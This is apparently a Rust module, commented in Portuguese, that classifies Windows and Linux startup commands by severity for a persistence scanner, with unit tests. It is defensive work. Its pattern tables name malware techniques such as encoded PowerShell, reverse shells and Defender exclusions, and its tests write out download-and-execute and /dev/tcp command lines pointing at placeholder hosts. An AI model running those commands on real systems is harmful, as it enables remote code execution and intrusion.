use crate::finding::Severity;

// Padrões em minúsculas. Listas pequenas e legíveis de propósito: servem para estudo.
const HIGH: &[(&str, &str)] = &[
    (" -enc", "PowerShell com comando codificado"),
    ("-encodedcommand", "PowerShell com comando codificado"),
    ("mshta", "Executa HTA, usado para rodar script remoto"),
    (
        "javascript:",
        "Executa JavaScript pela linha de comando (técnica com rundll32/mshta)",
    ),
    (
        "scrobj",
        "Carrega um scriptlet (técnica do regsvr32 para rodar script remoto)",
    ),
    (
        "invoke-expression",
        "PowerShell executando texto como código",
    ),
    (
        "frombase64string",
        "PowerShell decodificando comando escondido",
    ),
    (
        "process call create",
        "Cria processo pelo WMI (executa sem janela)",
    ),
    (
        "delete shadows",
        "Apaga cópias de sombra do Windows (comportamento típico de ransomware)",
    ),
    (
        "recoveryenabled no",
        "Desliga a recuperação de inicialização do Windows",
    ),
    ("allprofiles state off", "Desliga o firewall do Windows"),
    ("-urlcache", "certutil baixando arquivo da internet"),
    ("/transfer", "bitsadmin baixando arquivo em segundo plano"),
    ("stratum+tcp", "Conexão de pool de mineração de criptomoeda"),
    (
        "--donate-level",
        "Argumento típico de minerador de criptomoeda",
    ),
    (
        "-exclusionpath",
        "Adiciona exclusão ao Windows Defender (esconde pasta do antivírus)",
    ),
    (
        "disablerealtimemonitoring",
        "Desliga a proteção em tempo real do Windows Defender",
    ),
    ("\\temp\\", "Executa a partir de pasta temporária"),
    ("%temp%", "Executa a partir de pasta temporária"),
    ("%tmp%", "Executa a partir de pasta temporária"),
];

// Um endereço de rede sozinho é comum (atalho de aplicativo, `--app=https://...`): só SUSPEITO.
// Vira ALTO quando a mesma linha também chama um programa que baixa e executa.
const URL_MARKERS: &[&str] = &["http://", "https://"];
const DOWNLOADERS: &[&str] = &[
    "powershell",
    "pwsh",
    "bitsadmin",
    "certutil",
    "regsvr32",
    "rundll32",
    "curl",
    "wget",
    "wscript",
    "cscript",
];

fn has_url(c: &str) -> bool {
    URL_MARKERS.iter().any(|m| c.contains(m))
}

// Suspeita pelo QUE executa: assinatura digital não limpa isso.
const SCRIPT: &[(&str, &str)] = &[
    ("wscript", "Interpretador de script do Windows"),
    ("cscript", "Interpretador de script do Windows"),
    ("-windowstyle hidden", "PowerShell com janela oculta"),
    (" -w hidden", "PowerShell com janela oculta"),
    (".vbs", "Arquivo de script"),
    (".js", "Arquivo de script"),
    (".bat", "Arquivo de script"),
    (".cmd", "Arquivo de script"),
    (".ps1", "Arquivo de script"),
    (
        ".scr",
        "Protetor de tela, extensão muito usada para disfarçar executável",
    ),
    ("attrib +h", "Esconde arquivos pela linha de comando"),
    (
        "schtasks /create",
        "Cria uma tarefa agendada a partir de outro programa",
    ),
    (
        "localgroup administrators",
        "Mexe no grupo de administradores",
    ),
];

// Suspeita só pelo ONDE está: uma assinatura digital válida pode rebaixar (ver `trust`).
const LOCATION: &[(&str, &str)] = &[
    ("\\appdata\\", "Fora das pastas padrão do sistema (AppData)"),
    ("%appdata%", "Fora das pastas padrão do sistema (AppData)"),
    (
        "%localappdata%",
        "Fora das pastas padrão do sistema (AppData)",
    ),
    (
        "\\programdata\\",
        "Fora das pastas padrão do sistema (ProgramData)",
    ),
    (
        "\\users\\public\\",
        "Pasta pública gravável por qualquer usuário",
    ),
    ("\\downloads\\", "Executa a partir da pasta de downloads"),
    (
        "\\perflogs\\",
        "Pasta de registros do Windows que não deveria ter programas",
    ),
    ("$recycle.bin", "Executa de dentro da Lixeira"),
];

/// Padrões de extensão (`.js`) só valem se terminam ali: `host.json` não é script.
fn matches(c: &str, pattern: &str) -> bool {
    if !pattern.starts_with('.') {
        return c.contains(pattern);
    }
    c.match_indices(pattern).any(|(i, _)| {
        !c[i + pattern.len()..]
            .chars()
            .next()
            .is_some_and(char::is_alphanumeric)
    })
}

fn find(patterns: &'static [(&'static str, &'static str)], c: &str) -> Option<&'static str> {
    patterns
        .iter()
        .find(|(p, _)| matches(c, p))
        .map(|&(_, reason)| reason)
}

/// Classifica um comando ou caminho de inicialização por padrões conhecidos.
pub fn classify(command: &str) -> (Severity, &'static str) {
    let c = command.to_lowercase();
    if let Some(reason) = find(HIGH, &c) {
        return (Severity::High, reason);
    }
    if has_url(&c) {
        return if DOWNLOADERS.iter().any(|d| c.contains(d)) {
            (Severity::High, "Baixa ou executa algo pela rede")
        } else {
            (
                Severity::Suspicious,
                "Contém um endereço de rede (comum em atalhos de aplicativos; confira)",
            )
        };
    }
    if let Some(reason) = find(SCRIPT, &c).or_else(|| find(LOCATION, &c)) {
        return (Severity::Suspicious, reason);
    }
    (Severity::Info, "Sem padrão suspeito conhecido")
}

// Linux. Aqui `curl`/`wget` sozinhos são comuns em cron legítimo (SUSPEITO); o que denuncia é
// executar a partir de pasta gravável por todos, ou baixar e já executar.
const HIGH_LINUX: &[(&str, &str)] = &[
    (
        "/dev/shm/",
        "Executa a partir de memória compartilhada (/dev/shm)",
    ),
    ("/tmp/", "Executa a partir de pasta temporária"),
    (
        "/dev/tcp/",
        "Abre conexão de rede direto pelo shell (shell reverso)",
    ),
    ("base64 -d", "Decodifica e executa conteúdo ofuscado"),
    ("base64 --decode", "Decodifica e executa conteúdo ofuscado"),
    ("| sh", "Baixa e executa direto no shell"),
    ("|sh", "Baixa e executa direto no shell"),
    ("| bash", "Baixa e executa direto no shell"),
    ("|bash", "Baixa e executa direto no shell"),
    ("nc -e", "Netcat executando comando (shell reverso)"),
    ("ncat -e", "Netcat executando comando (shell reverso)"),
    ("bash -i", "Shell interativo (comum em shell reverso)"),
];
const SUSPICIOUS_LINUX: &[(&str, &str)] = &[
    ("curl ", "Acessa a rede por linha de comando"),
    ("wget ", "Acessa a rede por linha de comando"),
    (
        "/var/tmp/",
        "Executa a partir de pasta temporária persistente",
    ),
    ("python -c", "Executa código passado na linha de comando"),
    ("python3 -c", "Executa código passado na linha de comando"),
    ("perl -e", "Executa código passado na linha de comando"),
];

/// Classifica um comando de inicialização do Linux (systemd, cron, autostart).
pub fn classify_linux(command: &str) -> (Severity, &'static str) {
    let c = command.to_lowercase();
    if let Some(reason) = find(HIGH_LINUX, &c) {
        (Severity::High, reason)
    } else if let Some(reason) = find(SUSPICIOUS_LINUX, &c) {
        (Severity::Suspicious, reason)
    } else {
        (Severity::Info, "Sem padrão suspeito conhecido")
    }
}

const SCRIPT_EXTS: &[&str] = &[".vbs", ".js", ".bat", ".cmd", ".ps1", ".scr"];
const SYSTEM_DIRS: &[&str] = &["%systemroot%\\system32\\", "c:\\windows\\system32\\"];

/// Verdadeiro se a suspeita é só de script e todo script citado está na pasta System32,
/// que só administradores gravam. Interpretador sem arquivo de script (ex.: `wscript x`) não vale.
/// shortcut: não verifica dono nem hash do script; ler o dono (TrustedInstaller) se for preciso endurecer.
pub fn is_system_script(command: &str) -> bool {
    let c = command.to_lowercase();
    if find(HIGH, &c).is_some() || has_url(&c) || find(SCRIPT, &c).is_none() {
        return false;
    }
    let mut scripts = c
        .split_whitespace()
        .map(|t| t.trim_matches('"'))
        .filter(|t| SCRIPT_EXTS.iter().any(|e| t.ends_with(e)))
        .peekable();
    scripts.peek().is_some() && scripts.all(|t| SYSTEM_DIRS.iter().any(|d| t.starts_with(d)))
}

/// Verdadeiro se a única suspeita é o local (nem sinal forte, nem script).
pub fn is_location_only(command: &str) -> bool {
    let c = command.to_lowercase();
    find(HIGH, &c).is_none()
        && !has_url(&c)
        && find(SCRIPT, &c).is_none()
        && find(LOCATION, &c).is_some()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn encoded_powershell_is_high() {
        assert_eq!(
            classify("powershell.exe -NoP -Enc SQBFAFgA").0,
            Severity::High
        );
    }

    #[test]
    fn temp_path_is_high() {
        assert_eq!(
            classify(r"C:\Users\x\AppData\Local\Temp\a.exe").0,
            Severity::High
        );
    }

    #[test]
    fn appdata_is_suspicious() {
        assert_eq!(
            classify(r"C:\Users\x\AppData\Roaming\app.exe").0,
            Severity::Suspicious
        );
    }

    #[test]
    fn script_is_suspicious() {
        assert_eq!(
            classify(r"C:\Windows\System32\wscript.exe x.vbs").0,
            Severity::Suspicious
        );
    }

    #[test]
    fn system_path_is_info() {
        assert_eq!(
            classify(r"C:\Windows\system32\svchost.exe -k netsvcs").0,
            Severity::Info
        );
    }

    #[test]
    fn script_extension_must_end_the_word() {
        assert_eq!(
            classify(r#"a.exe --config="C:\x\host.json""#).0,
            Severity::Info
        );
        assert_eq!(classify(r"node C:\x\run.js").0, Severity::Suspicious);
        assert_eq!(
            classify(r#"node "C:\x\run.js" --a"#).0,
            Severity::Suspicious
        );
    }

    #[test]
    fn system_script_needs_every_script_inside_system32() {
        assert!(is_system_script(
            r"%systemroot%\system32\cmd.exe /d /c %systemroot%\system32\task.cmd"
        ));
        assert!(is_system_script(r#"cmd /c "C:\Windows\System32\a.bat""#));
        assert!(!is_system_script(r"cmd /c C:\ProgramData\a.cmd"));
        assert!(!is_system_script(
            r"cmd /c %systemroot%\system32\a.cmd D:\x\b.bat"
        ));
    }

    #[test]
    fn system_script_rejects_interpreter_only_and_strong_signals() {
        assert!(!is_system_script(r"C:\Windows\System32\wscript.exe"));
        assert!(!is_system_script(
            r"cmd /c C:\Windows\System32\a.cmd https://evil"
        ));
        assert!(!is_system_script(r"C:\Windows\System32\notepad.exe"));
        assert!(!is_system_script(""));
    }

    #[test]
    fn linux_download_and_execute_is_high() {
        assert_eq!(
            classify_linux("curl -s http://x/a.sh | sh").0,
            Severity::High
        );
        assert_eq!(classify_linux("/tmp/.x/miner --pool a").0, Severity::High);
        assert_eq!(
            classify_linux("bash -c 'exec 5<>/dev/tcp/1.2.3.4/80'").0,
            Severity::High
        );
    }

    #[test]
    fn linux_plain_network_tools_are_only_suspicious() {
        assert_eq!(
            classify_linux("curl -fsS https://hc-ping.com/abc").0,
            Severity::Suspicious
        );
        assert_eq!(
            classify_linux("python3 -c 'print(1)'").0,
            Severity::Suspicious
        );
    }

    #[test]
    fn linux_ordinary_commands_and_empty_are_info() {
        assert_eq!(
            classify_linux("/usr/bin/logrotate /etc/logrotate.conf").0,
            Severity::Info
        );
        assert_eq!(classify_linux("").0, Severity::Info);
    }

    #[test]
    fn an_app_shortcut_with_a_url_is_only_suspicious() {
        // O caso da auditoria: atalho legítimo de aplicativo web, que a limpeza apagaria com --yes.
        let (sev, why) = classify(
            r#""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --app=https://mail.exemplo.com"#,
        );
        assert_eq!(sev, Severity::Suspicious);
        assert!(why.contains("endereço de rede"));
    }

    #[test]
    fn a_url_with_a_downloader_is_high() {
        for cmd in [
            r#"powershell -c "iwr https://x.example/a.ps1 | iex""#,
            "certutil -urlcache -f http://x.example/a.exe a.exe",
            "bitsadmin /transfer j https://x.example/a.exe C:\\a.exe",
            r"regsvr32 /s /u /i:http://x.example/a.sct scrobj.dll",
        ] {
            assert_eq!(classify(cmd).0, Severity::High, "{cmd}");
        }
    }

    #[test]
    fn a_url_is_never_location_only_or_a_system_script() {
        assert!(!is_location_only(
            r"C:\ProgramData\x\a.exe --app=https://x.example"
        ));
        assert!(!is_system_script(
            r"cmd /c %systemroot%\system32\a.cmd https://x.example"
        ));
    }

    /// Todo padrão ALTO da tabela tem de classificar como ALTO quando aparece numa linha de comando, e todo
    /// padrão de script como SUSPEITO. Orientado pela tabela de propósito: o arquivo não precisa trazer
    /// linhas de ataque escritas por extenso (antivírus costumam reclamar delas).
    #[test]
    fn every_pattern_in_the_tables_classifies_as_its_tier() {
        for (pattern, _) in HIGH {
            let cmd = format!("programa.exe {pattern} argumento");
            assert_eq!(classify(&cmd).0, Severity::High, "{pattern}");
        }
        for (pattern, _) in SCRIPT {
            let cmd = format!("programa.exe {pattern}");
            assert!(classify(&cmd).0 >= Severity::Suspicious, "{pattern}");
        }
    }

    #[test]
    fn ordinary_commands_stay_info() {
        for cmd in [
            r#""C:\Program Files\App\app.exe" --minimized"#,
            r"C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL",
            r"C:\Windows\explorer.exe",
        ] {
            assert_eq!(classify(cmd).0, Severity::Info, "{cmd}");
        }
    }

    #[test]
    fn empty_command_is_info() {
        assert_eq!(classify("").0, Severity::Info);
    }

    #[test]
    fn matching_ignores_case() {
        assert_eq!(
            classify(r"C:\USERS\X\APPDATA\ROAMING\A.EXE").0,
            Severity::Suspicious
        );
    }

    #[test]
    fn location_only_excludes_scripts_and_strong_signals() {
        assert!(is_location_only(r"C:\ProgramData\x\a.exe"));
        assert!(!is_location_only(r"C:\ProgramData\x\a.vbs"));
        assert!(!is_location_only(r"C:\ProgramData\x\a.exe https://evil"));
        assert!(!is_location_only(r"C:\Windows\a.exe"));
    }
}
